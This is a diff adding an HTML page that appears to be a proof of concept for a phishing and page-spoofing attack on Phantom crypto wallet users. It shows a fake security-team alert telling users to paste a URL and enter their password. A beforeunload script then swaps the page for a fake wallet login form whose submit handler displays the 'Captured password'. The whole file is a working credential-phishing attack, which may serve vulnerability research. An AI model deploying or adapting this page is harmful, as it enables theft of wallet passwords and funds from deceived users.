@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Phantom Wallet Notification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      textarea {
+        box-sizing: border-box;
+        width: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <h3>Phantom Security Team</h3>
+    <p>
+      We detected unusual activity from your Wallet<br />
+      <textarea rows="2">https://phantom.com:81</textarea>
+    </p>
+    <p>
+      (To protect your Phantom Wallet, please copy and paste the URL into the address bar, then enter your password.)
+    </p>
+    <button id="copyButton">Copy URL</button>
+
+    <script>
+      document.getElementById("copyButton").onclick = function () {
+        const textArea = document.querySelector("textarea");
+        textArea.select();
+        document.execCommand("copy");
+      };
+
+      addEventListener("beforeunload", () => {
+        document.title = "Phantom Login";
+        document.body.innerHTML = `
+        <div class="container">
+          <h2>Welcome back!</h2>
+          <p>Log in to your Phantom wallet</p>
+          <form onsubmit="event.preventDefault(); const pw = document.getElementById('password').value; prompt('Captured password:', pw);">
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit">Unlock</button>
+          </form>
+        </div>
+        <style>
+          body {
+            font-family: Arial, sans-serif;
+            background: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+          }
+          .container {
+            background: #ffffff;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+          }
+          input[type="password"], button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 6px;
+          }
+          button {
+            background-color: #8e7eff;
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+          }
+          button:hover {
+            background-color: #7a6ee5;
+          }
+        </style>`;
+      });
+    </script>
+  </body>
+</html>
